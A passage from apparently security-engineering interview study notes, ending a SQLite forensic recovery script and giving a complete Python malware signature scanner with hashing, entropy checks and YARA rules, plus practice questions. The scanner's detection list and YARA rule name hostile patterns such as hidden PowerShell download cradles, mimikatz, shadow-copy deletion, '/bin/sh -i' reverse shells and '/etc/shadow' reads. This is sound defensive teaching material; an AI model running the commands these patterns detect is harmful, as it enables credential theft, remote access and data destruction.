    """Extract strings, URLs, emails, and timestamps from raw bytes."""
    return {name: [m.decode("utf-8", errors="replace") for m in pat.findall(data)]
            for name, pat in CARVE_PATTERNS.items()}


def recover_from_free_pages(filepath: str, header_info: dict) -> dict:
    """Read free pages and carve data from them."""
    page_size = header_info["page_size"]
    free_pages = get_freelist_pages(filepath, header_info)
    all_data = bytearray()

    with open(filepath, "rb") as f:
        for page_num in free_pages:
            f.seek((page_num - 1) * page_size)
            all_data.extend(f.read(page_size))

    file_size = os.path.getsize(filepath)
    expected_size = header_info["page_count"] * page_size
    if file_size > expected_size:
        with open(filepath, "rb") as f:
            f.seek(expected_size)
            all_data.extend(f.read())

    recovered = carve_artifacts(bytes(all_data))
    recovered["free_pages_found"] = len(free_pages)
    for key in ("strings", "urls", "emails", "timestamps"):
        recovered[key] = sorted(set(recovered[key]))
    return recovered


def recover_wal(filepath: str) -> dict:
    """Check for and parse WAL file for additional records."""
    wal_path = filepath + "-wal"
    if not os.path.exists(wal_path):
        return {}
    with open(wal_path, "rb") as f:
        return carve_artifacts(f.read())


def full_recovery(filepath: str) -> dict:
    """Run a complete forensic recovery on a SQLite database."""
    header_info = validate_sqlite(filepath)
    if not header_info["valid"]:
        return header_info
    return {
        "file": os.path.abspath(filepath),
        "header": header_info,
        "recovered_data": recover_from_free_pages(filepath, header_info),
        "wal_recovery": recover_wal(filepath),
    }


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python sqlite_recovery.py <database.db>")
        sys.exit(1)
    db_path = sys.argv[1]
    if not os.path.exists(db_path):
        print(f"Error: File not found: {db_path}")
        sys.exit(1)
    report = full_recovery(db_path)
    print(json.dumps(report, indent=2, default=str))
```

### Extensions

- Parse SQLite record format to reconstruct full row tuples rather than just strings.
- Support browser-specific databases (Chrome History, Firefox places.sqlite).

### Interview Relevance

- Core DFIR skill: explain how deleted data persists on disk and how SQLite manages free space.
- Hands-on file format experience that most candidates only know theoretically.

### References

- [SQLite File Format Documentation](https://www.sqlite.org/fileformat.html)
- [Sanderson, SQLite Forensics (book)](https://sqliteforensics.com/)

---

## 9. Malware Signature Scanner -- Binary Analysis and YARA Rules

### Challenge Description

Build a malware signature scanner with string-based signatures and YARA integration. Write custom YARA rules, scan directories, and generate detection reports.

### Learning Objectives

- Understand signature-based detection, its limitations, and evasion techniques.
- Write YARA rules with string patterns, conditions, and metadata.
- Implement file hashing for hash-based IOC matching.

### Complete Solution

```python
"""Malware Signature Scanner -- Educational Implementation"""
import hashlib
import json
import math
import os
import sys
from datetime import datetime
from pathlib import Path

try:
    import yara
    YARA_AVAILABLE = True
except ImportError:
    YARA_AVAILABLE = False
    print("[!] yara-python not installed. YARA scanning disabled.")
    print("    Install with: pip install yara-python")



def hash_file(filepath: str) -> dict:
    """Compute MD5 and SHA256 hashes for a file."""
    md5 = hashlib.md5()
    sha256 = hashlib.sha256()
    with open(filepath, "rb") as f:
        for chunk in iter(lambda: f.read(8192), b""):
            md5.update(chunk)
            sha256.update(chunk)
    return {"md5": md5.hexdigest(), "sha256": sha256.hexdigest()}


def load_ioc_hashes(ioc_file: str) -> set:
    """Load a file of known-bad hashes (one per line)."""
    hashes = set()
    with open(ioc_file) as f:
        for line in f:
            h = line.strip().lower()
            if h and not h.startswith("#"):
                hashes.add(h)
    return hashes



BUILTIN_SIGNATURES = [
    {"name": "cmd_exec", "pattern": b"cmd.exe /c", "severity": "HIGH"},
    {"name": "powershell_hidden", "pattern": b"powershell -w hidden", "severity": "HIGH"},
    {"name": "download_cradle", "pattern": b"DownloadString", "severity": "HIGH"},
    {"name": "invoke_expression", "pattern": b"Invoke-Expression", "severity": "HIGH"},
    {"name": "mimikatz_ref", "pattern": b"mimikatz", "severity": "CRITICAL"},
    {"name": "shadow_copy_delete", "pattern": b"vssadmin delete shadows", "severity": "CRITICAL"},
    {"name": "reverse_shell", "pattern": b"/bin/sh -i", "severity": "HIGH"},
    {"name": "etc_shadow", "pattern": b"/etc/shadow", "severity": "HIGH"},
]


def scan_signatures(filepath: str, signatures: list = None) -> list:
    """Scan a file for known-bad byte patterns."""
    signatures = signatures or BUILTIN_SIGNATURES
    try:
        with open(filepath, "rb") as f:
            content = f.read()
    except (PermissionError, OSError):
        return []
    return [{"rule_name": s["name"], "severity": s["severity"], "occurrences": content.count(s["pattern"])}
            for s in signatures if s["pattern"] in content]



def calculate_entropy(data: bytes) -> float:
    """Calculate Shannon entropy. High entropy (> 7.0) suggests packing."""
    if not data:
        return 0.0
    freq = [0] * 256
    for byte in data:
        freq[byte] += 1
    length = len(data)
    entropy = 0.0
    for count in freq:
        if count > 0:
            p = count / length
            entropy -= p * math.log2(p)
    return entropy


def entropy_analysis(filepath: str) -> dict:
    """Analyze file entropy to detect packed/encrypted content."""
    with open(filepath, "rb") as f:
        data = f.read()
    overall = calculate_entropy(data)
    return {"overall": round(overall, 4), "is_likely_packed": overall > 7.0}



SAMPLE_YARA_RULES = """
rule Suspicious_PowerShell {
    meta:
        description = "Detects suspicious PowerShell patterns"
        severity = "HIGH"
    strings:
        $ps1 = "powershell" nocase
        $enc = "-EncodedCommand" nocase
        $bypass = "-ExecutionPolicy Bypass" nocase
        $iex = "IEX(" nocase
        $dl = "DownloadString" nocase
    condition:
        $ps1 and any of ($enc, $bypass, $iex, $dl)
}
"""


def compile_yara_rules(rules_source: str = None, rules_file: str = None):
    """Compile YARA rules from a string or file."""
    if not YARA_AVAILABLE:
        return None
    try:
        if rules_file and os.path.exists(rules_file):
            return yara.compile(filepath=rules_file)
        elif rules_source:
            return yara.compile(source=rules_source)
    except yara.SyntaxError as e:
        print(f"[!] YARA syntax error: {e}")
    return None


def scan_with_yara(filepath: str, rules) -> list:
    """Scan a file with compiled YARA rules."""
    if rules is None:
        return []
    try:
        return [{"rule": m.rule, "meta": m.meta} for m in rules.match(filepath)]
    except yara.Error as e:
        return [{"error": str(e)}]



def scan_file(filepath: str, ioc_hashes: set = None, yara_rules=None) -> dict:
    """Run all detection methods on a single file."""
    hashes = hash_file(filepath)
    detections = []

    if ioc_hashes and (hashes["md5"] in ioc_hashes or hashes["sha256"] in ioc_hashes):
        detections.append({"method": "hash_ioc", "severity": "CRITICAL"})

    for m in scan_signatures(filepath):
        detections.append({"method": "signature", "severity": m["severity"], "rule": m["rule_name"]})

    entropy = entropy_analysis(filepath)
    if entropy["is_likely_packed"]:
        detections.append({"method": "entropy", "severity": "MEDIUM", "value": entropy["overall"]})

    for m in scan_with_yara(filepath, yara_rules):
        if "error" not in m:
            detections.append({"method": "yara", "severity": m.get("meta", {}).get("severity", "MEDIUM"), "rule": m["rule"]})

    severities = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1}
    max_sev = max((severities.get(d["severity"], 0) for d in detections), default=0)
    overall = {4: "CRITICAL", 3: "HIGH", 2: "MEDIUM", 1: "LOW"}.get(max_sev, "CLEAN")

    return {"file": filepath, "hashes": hashes, "detections": detections, "severity": overall}


def scan_directory(directory: str, ioc_hashes: set = None, yara_rules=None) -> list:
    """Recursively scan a directory."""
    results = []
    for filepath in Path(directory).rglob("*"):
        if not filepath.is_file():
            continue
        try:
            results.append(scan_file(str(filepath), ioc_hashes, yara_rules))
        except Exception as e:
            results.append({"file": str(filepath), "error": str(e)})
    return results


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python malware_scanner.py <file|--dir directory> [--iocs hashfile] [--yara rules.yar]")
        sys.exit(1)

    ioc_hashes = set()
    if "--iocs" in sys.argv:
        idx = sys.argv.index("--iocs")
        ioc_hashes = load_ioc_hashes(sys.argv[idx + 1])

    yara_rules = compile_yara_rules(rules_source=SAMPLE_YARA_RULES)
    if "--yara" in sys.argv:
        idx = sys.argv.index("--yara")
        yara_rules = compile_yara_rules(rules_file=sys.argv[idx + 1])

    if "--dir" in sys.argv:
        idx = sys.argv.index("--dir")
        results = scan_directory(sys.argv[idx + 1], ioc_hashes, yara_rules)
        detections = [r for r in results if r.get("severity", "CLEAN") != "CLEAN"]
        print(json.dumps(detections, indent=2, default=str))
    else:
        result = scan_file(sys.argv[1], ioc_hashes, yara_rules)
        print(json.dumps(result, indent=2, default=str))
```

### Extensions

- Add PE header parsing to check for section name anomalies, suspicious imports, and packer signatures.
- Integrate with VirusTotal's API for hash lookups.

### Interview Relevance

- YARA rules, signature-based vs. behavioral detection, and AV evasion are frequent interview topics.
- Building your own scanner gives concrete talking points about detection trade-offs and false positive rates.

### References

- [YARA documentation](https://yara.readthedocs.io/)
- [MITRE ATT&CK -- Defense Evasion](https://attack.mitre.org/tactics/TA0005/)

---

## Key Takeaways

1. **Build both sides.** For every offensive tool, think about the defensive counterpart. This dual perspective is what separates security engineers from script kiddies.
2. **Understand the "why."** Explaining TCP state transitions or why SYN scans are stealthier -- that is what gets you hired, not just building the tool.
3. **Ethics are non-negotiable.** Always frame offensive techniques in terms of authorized testing and defensive understanding.
4. **Start simple, then layer complexity.** Get the basic version working in 30 minutes, then discuss extensions verbally.

## Additional Challenge Ideas

- **Packet sniffer:** Use `scapy` to capture traffic and flag cleartext credentials.
- **DNS tunneling detector:** Parse DNS query logs to detect exfiltration through long subdomain labels.
- **File integrity monitor:** Hash critical system files and detect unauthorized changes (tripwire clone).
- **Honeypot:** Build a fake SSH/HTTP service that logs connection attempts for threat intelligence.

## Interview Practice Questions

1. "Walk me through how you would design a port scanner. What are the trade-offs between a SYN scan and a connect scan?"
2. "Given a 10 GB log file, how would you efficiently extract all unique IP addresses and their request counts?"
3. "Write a YARA rule to detect a PowerShell download cradle. How would an attacker evade your rule?"
4. "How does SQLite handle deleted records, and how would you recover them in a forensic investigation?"
5. "Design a system to detect credential stuffing attacks in real time. What signals would you look for?"
6. "Explain how a botnet's C2 infrastructure works. How would you detect C2 traffic on your network?"

---
[Previous: Coding & Algorithms](coding-algorithms.md) | [Back to Main Notes](../interview-study-notes-for-security-engineering.md)
